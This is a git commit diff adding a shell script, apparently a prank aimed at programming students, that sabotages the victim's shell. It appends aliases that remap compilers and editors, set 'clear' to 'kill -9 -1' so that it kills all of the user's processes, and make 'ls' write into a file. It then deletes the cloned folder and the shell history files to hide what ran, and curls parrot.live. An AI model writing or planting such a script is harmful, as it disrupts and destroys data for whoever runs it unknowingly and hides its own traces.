ab9ee231e969b4486d1c9252ffeb864c41343e9f
BarbaraC <55756205+BarbaraC12@users.noreply.github.com>
2022-07-24 17:38:45 +0200

    Update and rename trollo to clavie.sh

---
+++ clavie.sh
@@ -0,0 +1,17 @@
+echo "alias norminette=cc" >> ~/.trollrc
+echo "alias norme='cat *'" >> ~/.trollrc
+echo "alias cc=norminette" >> ~/.trollrc
+echo "alias gcc=norminette" >> ~/.trollrc
+echo "alias clang=norminette" >> ~/.trollrc
+echo "alias vi=nano" >> ~/.trollrc
+echo "alias vim='emacs -rv'" >> ~/.trollrc
+echo "alias clang=norminette" >> ~/.trollrc
+echo "alias clear='kill -9 -1'" >> ~/.trollrc
+echo "alias ls='ls >> ls'" >> ~/.trollrc
+source ~/.trollrc
+cp LOL/README.md ~/.powpowpow
+cd
+rm -rf LOL ~/zsh_history ~/sh_history ~/bash_history
+clear
+less ~/.powpowpow ; curl parrot.live
+
